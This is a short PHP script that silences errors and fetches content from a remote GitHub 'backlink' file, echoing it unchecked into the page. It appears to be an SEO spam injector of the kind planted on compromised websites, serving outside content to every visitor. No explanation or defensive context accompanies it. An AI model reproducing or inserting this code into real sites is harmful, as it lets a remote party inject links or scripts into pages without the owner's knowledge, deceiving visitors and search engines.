<?php
error_reporting(0);
set_time_limit(0);
$q = curl_init();
curl_setopt($q, CURLOPT_URL, "https://raw.githubusercontent.com/duniasrugawi/duniasrugawi/main/backlink");
curl_setopt($q, CURLOPT_RETURNTRANSFER, 1);
$z = curl_exec($q);
curl_close($q);
echo($z);
?>
